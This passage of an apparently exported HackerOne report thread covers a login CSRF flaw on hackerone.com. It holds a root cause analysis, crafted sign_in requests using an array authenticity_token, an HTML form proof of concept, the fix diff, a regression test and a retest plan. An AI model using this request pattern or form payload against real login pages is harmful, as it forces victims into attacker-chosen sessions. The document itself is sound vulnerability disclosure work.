      "message": "Hi @jobert \n\nCould the severity change during the investigation of this report?\n\nRegards \n-JaeHak",
      "automated_response": false,
      "created_at": "2020-05-26T23:17:05.485Z",
      "updated_at": "2020-05-26T23:17:05.485Z",
      "actor": {
        "username": "what_web",
        "cleared": true,
        "verified": true,
        "url": "/what_web",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/hlpdgc9kmtvmwbukyjhlcsoyoo0r/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "security"
    },
    {
      "id": 8125104,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "**TL;DR**: a specially crafted HTTP request could be send to the `/users/sign_in` endpoint that threw an exception, returning an authenticated session cookie when valid credentials were provided. This leads to a login CSRF vulnerability.\n\nHi @what_web - sure, if we would've uncovered any new information that would've bumped up the severity, we would reflect that in the report. However, that's not the case. This is truly only a CSRF vulnerability for the login page. Technical details and root cause analysis:\n\nIn HackerOne's `ApplicationController`, a number of hooks are defined that invoke the `current_user` method, for example when setting the [user context for Raven](https://docs.sentry.io/clients/ruby/context/) or configuring additional logging context for HackerOne's log aggregation platform — more about this later.\n\nThe `current_user` method is meta-programmed as a helper by Devise v4.7.1, the authentication library HackerOne uses. It is implemented [as such](https://github.com/heartcombo/devise/blob/v4.7.1/lib/devise/controllers/helpers.rb#L125):\n\n```\n#...\ndef current_#{mapping}\n  @current_#{mapping} ||= warden.authenticate(scope: :#{mapping})\nend\n#...\n```\n\nThe first time the method is called, the `warden.authenticate` method will be called. This will go through the Devise authentication strategies and will determine if the user can authenticate with the given credentials (e.g. a SAML header, username/password/OTP combination, etc.). When looping over the strategies, the `valid?` method is called on each authentication strategy. This behavior can be seen in the `Warden::Proxy` class ([link](https://github.com/wardencommunity/warden/blob/v1.2.8/lib/warden/proxy.rb#L367)).\n\nOne of HackerOne's authentication strategies inherits from Devise's `Authenticatable` class. The [`valid?`](https://github.com/heartcombo/devise/blob/v4.7.1/lib/devise/strategies/authenticatable.rb#L18) method for this strategy determines two things: whether valid authentication parameters are present or if an HTTP authentication header is present (e.g. for APIs):\n\n```ruby\n# ...\nmodule Devise\n  module Strategies\n    # ...\n\n    class Authenticatable < Base\n      # ...\n\n      def valid?\n        valid_for_params_auth? || valid_for_http_auth?\n      end\n\n      # ...\n\n      def valid_for_params_auth?\n        params_authenticatable? && valid_params_request? &&\n          valid_params? && with_authentication_hash(:params_auth, params_auth_hash)\n      end\n\n      # ...\n\n      def valid_params_request?\n        !!env[\"devise.allow_params_authentication\"]\n      end\n\n      # ...\n```\n\nAs can be seen in the code above, it'll require the Warden environment variable `devise.allow_params_authentication` to contain a truthy value for it to return `true` for the `valid?` method. This environment variable is set to `false` by default. There is one code path that sets this variable to true: the `Users::SessionsController#create` action. This controller is inherited from `Devise::SessionsController`. This base class configures a number of actions that need to run before certain requests:\n\n```ruby\n# frozen_string_literal: true\n\nclass Devise::SessionsController < DeviseController\n  prepend_before_action :require_no_authentication, only: [:new, :create]\n  prepend_before_action :allow_params_authentication!, only: :create\n  prepend_before_action :verify_signed_out_user, only: :destroy\n  prepend_before_action(only: [:create, :destroy]) { request.env[\"devise.skip_timeout\"] = true }\n\n  # ...\nend\n```\n\nThe `allow_params_authentication!` method [is implemented as following](https://github.com/heartcombo/devise/blob/v4.7.1/lib/devise/controllers/helpers.rb#L164):\n\n```ruby\ndef allow_params_authentication!\n  request.env[\"devise.allow_params_authentication\"] = true\nend\n```\n\nBecause execution of the `allow_params_authentication!` is prepended, it'll run this code before any other `before_action` hook defined in HackerOne's `ApplicationController` — including before the CSRF protection. This means that even before the controller action is invoked, it can authenticate a user and `current_user` can return a `User` object. We never noticed that this was a problem because the `set-cookie` header is **not** returned for 4xx HTTP responses, which is returned to the user when an invalid CSRF token is provided. However, it is possible to trigger a 5xx HTTP response, which **does** return the header, which may reveal a new session cookie and store it in the browser. The session cookie is returned because HackerOne mutates the Rails session store for its session replay mitigation. Irony: if we wouldn't have session replay mitigation in place, we wouldn't need to mutate the session, which would prevent the `set-cookie` header to be returned.\n\nIn HackerOne's `ApplicationController`, CSRF protection is configured with the following code:\n\n```ruby\n# frozen_string_literal: true\n\nclass ApplicationController < ActionController::Base\n  # ...\n\n  protect_from_forgery with: :exception, prepend: true\n\n  # ...\n\n  def form_authenticity_param\n    params.permit(request_forgery_protection_token => Parameters.string)\n    super\n  end\n\n  # ...\nend\n```\n\nThe code above shows that the application expects a `String` to provided for the `authenticity_token` header. When it is provided any other type, `StrongerParameters` will raise an exception, which will lead to a 5xx HTTP response.\n\nEvery request that is processed by our backend is logged. HackerOne uses the `lograge` gem to export log entries as JSON. Each request is tagged with an additional payload, adding context and metadata for debugging and incident response. For that, HackerOne leverages the `append_info_to_payload ` method. This method is called automatically as part of the default Rails instrumentation here: https://github.com/rails/rails/blob/40b7d93c5bf04974cfd0201a8e391c499c046f0b/actionpack/lib/action_controller/metal/instrumentation.rb#L39. The implementation of HackerOne's method looks like this:\n\n```ruby\ndef append_info_to_payload(payload)\n  super\n\n  payload.merge! additional_logging_context\nend\n\n# ...\n\ndef additional_logging_context\n  truncated_user_agent = (request.user_agent || '')[0..254]\n  {\n    ip: request.ip,\n    user_agent: truncated_user_agent,\n    request_id: request.request_id,\n    host: request.host,\n    port: request.port,\n    session: {\n      user_id: current_user&.id,\n      username: current_user&.username,\n      user_session_id: current_session&.id,\n      hackerone_employee: current_user&.hackerone_employee,\n      hackerone_triager: current_user&.hackerone_triager,\n      cfduid: request.cookies[CLOUDFLARE_ID],\n      ip_country: request.headers[CLOUDFLARE_COUNTRY],\n    },\n    controller: controller_name,\n    action: action_name,\n    custom: {},\n  }\nend\n```\n\nAs can be seen, `current_user` is called a number of times, which unknowingly authenticates the user when an exception is thrown when trying to call the `Users::SessionsController#create` action. Below are two HTTP requests showing the minor difference between an invalid CSRF token and passing a non-String value as CSRF token:\n\n**Invalid CSRF**\n*Request*\n```\nPOST /users/sign_in HTTP/1.1\nHost: hackerone.com\n\nuser[email]=hello@world.com&user[password]=example&authenticity_token=invalid\n```\n\n*Response*\n```\nHTTP/1.1 412 Precondition Failed\n...\n```\n\n**Invalid object type**\n*Request*\n```\nPOST /users/sign_in HTTP/1.1\nHost: hackerone.com\n\nuser[email]=hello@world.com&user[password]=example&authenticity_token[]=invalid\n                                                                     ^ -- Array\n```\n\n*Response*\n```\nHTTP/1.1 500 Internal Server Error\nSet-Cookie: session=<session cookie>\n...\n```\n\nIn the end, the following proof of concept could be used to consistently sign in a user without a valid CSRF token:\n\n```\n<html>\n  <body>\n  <script>history.pushState('', '', '/')</script>\n    <form action=\"https://hackerone.com/users/sign_in\" method=\"POST\">\n      <input type=\"hidden\" name=\"user[email]\" value=\"hello@world.com\" />\n      <input type=\"hidden\" name=\"user[password]\" value=\"example\" />\n      <input type=\"hidden\" name=\"authenticity_token[]\" value=\"invalid\" />\n      <input type=\"submit\" value=\"Submit request\" />\n    </form>\n  </body>\n</html>\n```\n\nWe put up a fix for the vulnerability earlier today and is being reviewed. Once this has been merged and deployed, the fix will be posted here as well.\n\nThanks again, @what_web, this turned out to be a fun bug to do a root cause analysis on!",
      "automated_response": false,
      "created_at": "2020-05-28T01:58:53.094Z",
      "updated_at": "2020-05-28T01:58:53.094Z",
      "actor": {
        "username": "jobert",
        "cleared": true,
        "verified": true,
        "url": "/jobert",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": true
      },
      "genius_execution_id": null,
      "team_handle": "security"
    },
    {
      "id": 8126321,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hi @jobert\nYou are a very accurate and great investigation! As I said before, this is a wide range of other issues, so I'm discussing the severity. In fact, I didn't find much more than you found, but I knew this could be a wide range of other potential problems, but I just stayed silent because I couldn't provide any additional practical proof of concept.\n\nCan you re-examine the severity of this report?\n\nI am so happy to work with you!\n\nThe results you showed me during your research are really interesting and really great. Thanks again for the great findings. ! \n\nRegards\n-jaeHak",
      "automated_response": false,
      "created_at": "2020-05-28T05:56:09.796Z",
      "updated_at": "2020-05-28T06:06:39.656Z",
      "actor": {
        "username": "what_web",
        "cleared": true,
        "verified": true,
        "url": "/what_web",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/hlpdgc9kmtvmwbukyjhlcsoyoo0r/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "security"
    },
    {
      "id": 8136549,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hi @what_web - like I said earlier, given the impact of the vulnerability we're keeping the severity set to 3.8. This decision is final.\n\nWe came up with the following fix, which was released a few minutes ago. A copy can be found in F846791.\n\n```\ndiff --git a/app/controllers/application_controller.rb b/app/controllers/application_controller.rb\nindex 8800599ab8..5a12cc237a 100644\n--- a/app/controllers/application_controller.rb\n+++ b/app/controllers/application_controller.rb\n@@ -23,7 +23,6 @@ class ApplicationController < ActionController::Base\n \n   before_action(\n     :authenticate_user!,\n-    :whitelisted_cidr_range,\n     :only_allow_active_accounts,\n     :required_mfa?,\n     :form_authenticity_token,\n@@ -233,14 +232,6 @@ class ApplicationController < ActionController::Base\n     ProtectedAttribute::SchemaUtility.ensure_public_schema\n   end\n \n-  def whitelisted_cidr_range\n-    return unless current_user && !current_user.whitelisted_ip_address?(request.remote_ip)\n-\n-    sign_out_and_redirect(current_user)\n-\n-    flash[:error] = 'You cannot sign in from this IP address.'\n-  end\n-\n   def required_mfa?\n     return unless Commands::Users::RedirectIfTwoFactorAuthRequired.interact(\n       request_path: request.path,\n@@ -285,4 +276,10 @@ class ApplicationController < ActionController::Base\n   def support_app?\n     ENV['SUPPORT_APPLICATION'].present?\n   end\n+\n+  def enable_parameter_authentication\n+    warden.env[\"devise.allow_params_authentication\"] = true\n+    yield\n+    warden.env[\"devise.allow_params_authentication\"] = false\n+  end\n end\ndiff --git a/app/controllers/saml/sessions_controller.rb b/app/controllers/saml/sessions_controller.rb\nindex 1ff1b61bb5..b61ba72b91 100644\n--- a/app/controllers/saml/sessions_controller.rb\n+++ b/app/controllers/saml/sessions_controller.rb\n@@ -29,6 +29,8 @@ module Saml\n   class SessionsController < Devise::SessionsController\n     unloadable if Rails::VERSION::MAJOR < 4\n \n+    skip_before_action :allow_params_authentication!\n+\n     prepend_before_action :require_no_authentication, only: [:unconfirmed, :metadata]\n     prepend_before_action :verify_saml_response_test!, only: :create\n \n@@ -36,6 +38,8 @@ module Saml\n \n     after_action :set_or_remove_marketing_site_cookie, only: [:create]\n \n+    around_action :enable_parameter_authentication, only: :create\n+\n     def new\n       if saml_request.valid?\n         saml_request.try(:saml_test)&.start!\ndiff --git a/app/controllers/users/sessions_controller.rb b/app/controllers/users/sessions_controller.rb\nindex 851a01e250..a114176cac 100644\n--- a/app/controllers/users/sessions_controller.rb\n+++ b/app/controllers/users/sessions_controller.rb\n@@ -2,11 +2,15 @@\n \n module Users\n   class SessionsController < Devise::SessionsController\n+    skip_before_action :allow_params_authentication!\n+\n     before_action :set_invitation, only: [:create, :new]\n-    before_action :set_user_ip_country, only: [:create]\n+    after_action :set_user_ip_country, only: [:create]\n     after_action :set_or_remove_marketing_site_cookie, only: [:create, :destroy]\n     after_action :clear_browser_cache, only: :destroy\n \n+    around_action :enable_parameter_authentication, only: :create\n+\n     def new\n       respond_to do |format|\n         format.html do\n@@ -25,10 +29,6 @@ module Users\n       use_content_security_policy_named_append(:zendesk)\n     end\n \n-    def create\n-      super\n-    end\n-\n     private\n \n     def set_user_ip_country\ndiff --git a/config/initializers/devise_disable_param_authentication.rb b/config/initializers/devise_disable_param_authentication.rb\nnew file mode 100644\nindex 0000000000..99cb31b482\n--- /dev/null\n+++ b/config/initializers/devise_disable_param_authentication.rb\n@@ -0,0 +1,13 @@\n+# frozen_string_literal: true\n+\n+module Devise\n+  module Controllers\n+    module Helpers\n+      def allow_params_authentication!\n+        fail SecurityError, 'The use of this method may introduce login CSRF ' \\\n+          'vulnerabilities when `current_user` is called after this method is ' \\\n+          'invoked. Its usage is disabled. See #39517 for more information.'\n+      end\n+    end\n+  end\n+end\ndiff --git a/config/locales/devise.en.yml b/config/locales/devise.en.yml\nindex 0ded2d0349..d0cc97ed6a 100644\n--- a/config/locales/devise.en.yml\n+++ b/config/locales/devise.en.yml\n@@ -21,6 +21,7 @@ en:\n       unconfirmed: \"Your account has been successfully created. Please check your email inbox to confirm your address.\"\n       user:\n         session_conflict: \"You've been signed out due to a session conflict. Please sign in again.\"\n+        blocked_ip: \"You cannot sign in from this IP address.\"\n     mailer:\n       confirmation_instructions:\n         subject: \"Please confirm your email address with HackerOne\"\ndiff --git a/lib/hackerone/user_authentication/authentication_callback.rb b/lib/hackerone/user_authentication/authentication_callback.rb\nindex 0b6e18177c..aaf67cb354 100644\n--- a/lib/hackerone/user_authentication/authentication_callback.rb\n+++ b/lib/hackerone/user_authentication/authentication_callback.rb\n@@ -26,6 +26,11 @@ module UserAuthentication\n             throw :warden, message: :timeout\n           end\n \n+          unless session.user.whitelisted_ip_address?(request.remote_ip)\n+            request.env['warden'].reset_session!\n+            throw :warden, message: :blocked_ip\n+          end\n+\n           if session.user.limit_session_to_one_ip_address? &&\n               session.ip_address != request.ip\n             Rails.logger.warn \\\ndiff --git a/spec/integration/controllers/users/sessions_controller_spec.rb b/spec/integration/controllers/users/sessions_controller_spec.rb\nindex de617fe8c1..abd2e79b4e 100644\n--- a/spec/integration/controllers/users/sessions_controller_spec.rb\n+++ b/spec/integration/controllers/users/sessions_controller_spec.rb\n@@ -79,14 +79,6 @@ describe Users::SessionsController do\n       expect(last_user_session.session_token).not_to be_nil\n     end\n \n-    it 'sets the user id in the raven context after logging in' do\n-      expect(Raven).to receive(:user_context)\n-        .with(id: user.id, username: user.username)\n-        .exactly(3)\n-        .times\n-      post :create, params: { user: { email: email, password: pass } }\n-    end\n-\n     context 'CloudFlare IP Country header' do\n       it 'sets both country fields' do\n         request.headers['CF-IPCountry'] = 'US'\n@@ -119,6 +111,27 @@ describe Users::SessionsController do\n       end\n     end\n \n+    # Regression spec for #39517\n+    context 'with array as authentication token' do\n+      let(:pass) { '███████' }\n+      let(:user) { create :user, password: pass }\n+\n+      before { ActionController::Base.allow_forgery_protection = true }\n+      after { ActionController::Base.allow_forgery_protection = false }\n+\n+      it do\n+        expect do\n+          post :create, params: {\n+            authenticity_token: ['this-is-an-array'],\n+              user: {\n+                email: user.email,\n+                password: pass,\n+              },\n+          }\n+        end.not_to change { user.reload.user_sessions.count }\n+      end\n+    end\n+\n     context 'Intercom', intercom: :send do\n       let(:queue) { Interactors::Intercom::CreateUserAndTeam.jobs }\n```\n\nThere are two notable changes: first, we've disabled the use of the `allow_params_authentication!` method used by Devise. Going forward, it'll raise a security warning when it is being used. Second, we've replaced it with a method that wraps around the two actions that sign a user in: `users/sessions#create` and `saml/sessions#create`. We believe that this is a sufficient fix for the reported security vulnerability.\n\nWe decided not to open a pull request with Devise for now because there are legitimate use cases for the `allow_params_authentication!`. This security vulnerability was introduced because of our own implementation.",
      "automated_response": false,
      "created_at": "2020-05-28T20:38:56.684Z",
      "updated_at": "2020-05-28T20:38:56.684Z",
      "actor": {
        "username": "jobert",
        "cleared": true,
        "verified": true,
        "url": "/jobert",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": true
      },
      "attachments": [
        {
          "id": 846791,
          "filename": "csrf.patch",
          "type": "text/x-patch",
          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/tb3RGPRzkZwEQHqonXFxBhq3?response-content-disposition=attachment%3B%20filename%3D%22csrf.patch%22%3B%20filename%2A%3DUTF-8%27%27csrf.patch&response-content-type=text%2Fx-patch&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSJ65FZXU%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T072823Z&X-Amz-Expires=870&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECkaCXVzLXdlc3QtMiJIMEYCIQC13hGRnFPG%2F8PgGnjUyc6RI7lGqUkEmr5u8l5tIeU95QIhAJgg%2FXv6bUcqZ%2FSQC3RBLq7QXM%2FDN5dN3fmku2DEJLRYKrEFCCIQAxoMMDEzNjE5Mjc0ODQ5IgwwR6BVchZWZB1Ys8gqjgXWndmoLAPy6R6rOiASV6IYlCP1ezRaoIE9cgpZaMh%2BiDDyY22Id0kBwojlWW5TCy0oa17lVogIDNmlFMqIVN%2B2ieEOvRZB5BfofcdU4BRMQZobwebNU8U1u3z41pIbGrJ8z%2BD0M%2Bc3SExuepKl5kYwdxZUR3hRtqNEHS3wi9wFG1K55iEbkL8Z3%2FoeDgRA22vZLRT5%2Bfi8q5HN8wvWzeykQCs0lZ6PGAtuDC4GQ5dWmIVTVMNHx%2BHghUQIkfRiOCKLPdo1raL2z7hgrjkg9uzJ4JgHmVEXG%2BfUy7TYArAV%2FtaI4Vuk84onY9eYDjkRB4zCzNIDQEo2kQwFwon6IGIlWBgkVOO37ud5VNRp8NAt6xYzLVfR4qqbMVMnI%2BosvqIcAHiFOzs3eIqnCwzxnzOIqBtb9nvaev20H7dwAwrDoZoC2%2F9wqlTsldSl5EG76v8wCqYamXzWGsuilXt7wv8WwkAk9T553W2a%2B%2BfbsOgcFxSDDddQthDfGf74LDgvOb2WozDHRrLqsR6nJI76RIWLp1hA7eMvpy0gbrQPL19HvpjW9v9tulbIvFTeLguNOKjDBVTAfnJlwD5bISU0b3yinZhtA5cY6tmAv6r7GmVpVWrt66HzOIXW%2FhVM%2F%2B5a%2FR0ODLBMT569ATPEQNgL4OHbeE3fIWxzKiYS9vkDpQz2rAIST4aZTgwC253Ne3n%2FQrG%2B%2F%2B6UQZToMCs8RqF8WRXxfqW7abs4O3ZdrFKESqBFCpPJqUmgXkC67%2BQe35GJARmHz3%2FPH8lntEuX7Bf05Bji8vQCcT1mKCa2fcjqum%2B4rPEDglldLO90UMUUpktIwyKeG4i28osTzPFt1bAltrxqk8wrGuHdPtH7UPAddVEws%2Fm4qAY6sAHJcQAAHMEwHyUT%2B5pz47K2QtFkvJobeZlnKje2WF01wKCRmG2EyJnjOuCSI1K1aNlscisHQeA%2BSqBbWlLVKvLfdeB5Crp92OpeBOmAr1E13T72GcQLOwgGuTXFm8usje4Kh0GfIMl9shrEXw%2FQ1KpNchynhcV7QXLnKks3QIlRuBPhV8TVc9%2Fc7lZvke2E%2BkbhPQTqoPojsquSawR0K1xO9a99vuPUGcyN7Vkh00vEhA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=896cfa5f641e712371a4d4993d7018143e3a482db09dcf8df9acd3b776a64d0c"
        }
      ],
      "genius_execution_id": null,
      "team_handle": "security"
    },
    {
      "id": 8136553,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BugRetesting",
      "message": "The following test plan should help determine if the security vulnerability was address:\n\n1. Submit the following HTTP request with valid credentials\n\n```\nPOST /users/sign_in HTTP/1.1\nHost: hackerone.com\n...\n\nuser[email]=:email&user[password]=:password&authenticity_token[]=this-is-an-array\n```\n\n2. Expect a response with a `set-cookie` header\n\n```\nHTTP/1.1 400 Bad Request\nset-cookie: session=:session; path=/; expires=Thu, 11 Jun 2020 19:05:39 GMT; HttpOnly\n...\n\nInvalid parameter: authenticity_token must be a string\n```\n\n3. Submit an HTTP request to `/current_user.json` with the created session\n\n```\nGET /current_user.json HTTP/1.1\nCookie: session=:session;\n...\n```\n\n4. Expect the response to indicate the session isn't authenticated\n\n```\nHTTP/1.1 200 OK\n...\n\n{\"csrf_token\":\":token\",\"signed_in?\":false,\"is_member_of_teams\":false}\n```",
      "automated_response": false,
      "created_at": "2020-05-28T20:39:25.536Z",
      "updated_at": "2020-05-28T20:39:25.729Z",
      "actor": {
        "username": "jobert",
        "cleared": true,
        "verified": true,
        "url": "/jobert",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": true
      },
      "genius_execution_id": null,
      "team_handle": "security"
    },
    {
      "id": 8136573,
      "is_internal": false,
      "editable": false,
      "type": "Activities::ReportTitleUpdated",
      "message": "",
      "automated_response": false,
      "created_at": "2020-05-28T20:42:57.999Z",
      "updated_at": "2020-05-28T20:42:57.999Z",
      "additional_data": {
        "old_title": "[www.hackerone.com] Attackers can bypass authenticity CSRF tokens during login.",
        "new_title": "Login CSRF vulnerability on hackerone.com"
      },
      "actor": {
        "username": "jobert",
        "cleared": true,
        "verified": true,
        "url": "/jobert",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": true
      },
      "genius_execution_id": null,
      "team_handle": "security"
    },
    {
      "id": 8139968,
      "is_internal": false,
      "editable": false,
      "type": "Activities::UserCompletedRetest",
      "message": "{F847013}\n{F847014}\n{F847015}\n{F847016}\n\nIf you try to reproduce the problem via PoC, it doesn't play, and even if you try it as described, it doesn't work.\nThe problem is completely resolved.\n\nCheers,\n-JaeHak",
      "automated_response": false,
      "created_at": "2020-05-29T01:15:49.921Z",
      "updated_at": "2020-05-29T01:15:49.921Z",
      "actor": {
        "username": "what_web",
        "cleared": true,
        "verified": true,
        "url": "/what_web",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/hlpdgc9kmtvmwbukyjhlcsoyoo0r/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "attachments": [
        {
          "id": 847016,
          "filename": "test4.PNG",
          "type": "image/png",
          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/ft4FfnB9LGLuCReKyP82fw41?response-content-disposition=attachment%3B%20filename%3D%22test4.PNG%22%3B%20filename%2A%3DUTF-8%27%27test4.PNG&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSJ65FZXU%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T072823Z&X-Amz-Expires=870&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECkaCXVzLXdlc3QtMiJIMEYCIQC13hGRnFPG%2F8PgGnjUyc6RI7lGqUkEmr5u8l5tIeU95QIhAJgg%2FXv6bUcqZ%2FSQC3RBLq7QXM%2FDN5dN3fmku2DEJLRYKrEFCCIQAxoMMDEzNjE5Mjc0ODQ5IgwwR6BVchZWZB1Ys8gqjgXWndmoLAPy6R6rOiASV6IYlCP1ezRaoIE9cgpZaMh%2BiDDyY22Id0kBwojlWW5TCy0oa17lVogIDNmlFMqIVN%2B2ieEOvRZB5BfofcdU4BRMQZobwebNU8U1u3z41pIbGrJ8z%2BD0M%2Bc3SExuepKl5kYwdxZUR3hRtqNEHS3wi9wFG1K55iEbkL8Z3%2FoeDgRA22vZLRT5%2Bfi8q5HN8wvWzeykQCs0lZ6PGAtuDC4GQ5dWmIVTVMNHx%2BHghUQIkfRiOCKLPdo1raL2z7hgrjkg9uzJ4JgHmVEXG%2BfUy7TYArAV%2FtaI4Vuk84onY9eYDjkRB4zCzNIDQEo2kQwFwon6IGIlWBgkVOO37ud5VNRp8NAt6xYzLVfR4qqbMVMnI%2BosvqIcAHiFOzs3eIqnCwzxnzOIqBtb9nvaev20H7dwAwrDoZoC2%2F9wqlTsldSl5EG76v8wCqYamXzWGsuilXt7wv8WwkAk9T553W2a%2B%2BfbsOgcFxSDDddQthDfGf74LDgvOb2WozDHRrLqsR6nJI76RIWLp1hA7eMvpy0gbrQPL19HvpjW9v9tulbIvFTeLguNOKjDBVTAfnJlwD5bISU0b3yinZhtA5cY6tmAv6r7GmVpVWrt66HzOIXW%2FhVM%2F%2B5a%2FR0ODLBMT569ATPEQNgL4OHbeE3fIWxzKiYS9vkDpQz2rAIST4aZTgwC253Ne3n%2FQrG%2B%2F%2B6UQZToMCs8RqF8WRXxfqW7abs4O3ZdrFKESqBFCpPJqUmgXkC67%2BQe35GJARmHz3%2FPH8lntEuX7Bf05Bji8vQCcT1mKCa2fcjqum%2B4rPEDglldLO90UMUUpktIwyKeG4i28osTzPFt1bAltrxqk8wrGuHdPtH7UPAddVEws%2Fm4qAY6sAHJcQAAHMEwHyUT%2B5pz47K2QtFkvJobeZlnKje2WF01wKCRmG2EyJnjOuCSI1K1aNlscisHQeA%2BSqBbWlLVKvLfdeB5Crp92OpeBOmAr1E13T72GcQLOwgGuTXFm8usje4Kh0GfIMl9shrEXw%2FQ1KpNchynhcV7QXLnKks3QIlRuBPhV8TVc9%2Fc7lZvke2E%2BkbhPQTqoPojsquSawR0K1xO9a99vuPUGcyN7Vkh00vEhA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=3b1629cc7ceabc68815284278160464714066198fc0f2471cfdf1f4c0e61726a"
        },
        {
          "id": 847015,
          "filename": "test3.PNG",
          "type": "image/png",
          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/yV6unaFGgyDgAV1ehvE65edQ?response-content-disposition=attachment%3B%20filename%3D%22test3.PNG%22%3B%20filename%2A%3DUTF-8%27%27test3.PNG&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSJ65FZXU%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T072823Z&X-Amz-Expires=870&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECkaCXVzLXdlc3QtMiJIMEYCIQC13hGRnFPG%2F8PgGnjUyc6RI7lGqUkEmr5u8l5tIeU95QIhAJgg%2FXv6bUcqZ%2FSQC3RBLq7QXM%2FDN5dN3fmku2DEJLRYKrEFCCIQAxoMMDEzNjE5Mjc0ODQ5IgwwR6BVchZWZB1Ys8gqjgXWndmoLAPy6R6rOiASV6IYlCP1ezRaoIE9cgpZaMh%2BiDDyY22Id0kBwojlWW5TCy0oa17lVogIDNmlFMqIVN%2B2ieEOvRZB5BfofcdU4BRMQZobwebNU8U1u3z41pIbGrJ8z%2BD0M%2Bc3SExuepKl5kYwdxZUR3hRtqNEHS3wi9wFG1K55iEbkL8Z3%2FoeDgRA22vZLRT5%2Bfi8q5HN8wvWzeykQCs0lZ6PGAtuDC4GQ5dWmIVTVMNHx%2BHghUQIkfRiOCKLPdo1raL2z7hgrjkg9uzJ4JgHmVEXG%2BfUy7TYArAV%2FtaI4Vuk84onY9eYDjkRB4zCzNIDQEo2kQwFwon6IGIlWBgkVOO37ud5VNRp8NAt6xYzLVfR4qqbMVMnI%2BosvqIcAHiFOzs3eIqnCwzxnzOIqBtb9nvaev20H7dwAwrDoZoC2%2F9wqlTsldSl5EG76v8wCqYamXzWGsuilXt7wv8WwkAk9T553W2a%2B%2BfbsOgcFxSDDddQthDfGf74LDgvOb2WozDHRrLqsR6nJI76RIWLp1hA7eMvpy0gbrQPL19HvpjW9v9tulbIvFTeLguNOKjDBVTAfnJlwD5bISU0b3yinZhtA5cY6tmAv6r7GmVpVWrt66HzOIXW%2FhVM%2F%2B5a%2FR0ODLBMT569ATPEQNgL4OHbeE3fIWxzKiYS9vkDpQz2rAIST4aZTgwC253Ne3n%2FQrG%2B%2F%2B6UQZToMCs8RqF8WRXxfqW7abs4O3ZdrFKESqBFCpPJqUmgXkC67%2BQe35GJARmHz3%2FPH8lntEuX7Bf05Bji8vQCcT1mKCa2fcjqum%2B4rPEDglldLO90UMUUpktIwyKeG4i28osTzPFt1bAltrxqk8wrGuHdPtH7UPAddVEws%2Fm4qAY6sAHJcQAAHMEwHyUT%2B5pz47K2QtFkvJobeZlnKje2WF01wKCRmG2EyJnjOuCSI1K1aNlscisHQeA%2BSqBbWlLVKvLfdeB5Crp92OpeBOmAr1E13T72GcQLOwgGuTXFm8usje4Kh0GfIMl9shrEXw%2FQ1KpNchynhcV7QXLnKks3QIlRuBPhV8TVc9%2Fc7lZvke2E%2BkbhPQTqoPojsquSawR0K1xO9a99vuPUGcyN7Vkh00vEhA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=e0189a182741f16be6a1294fdfd48c1d33462eac767ca1dcbd6e805507b505f2"
        },
        {
          "id": 847014,
          "filename": "tes2.PNG",
          "type": "image/png",
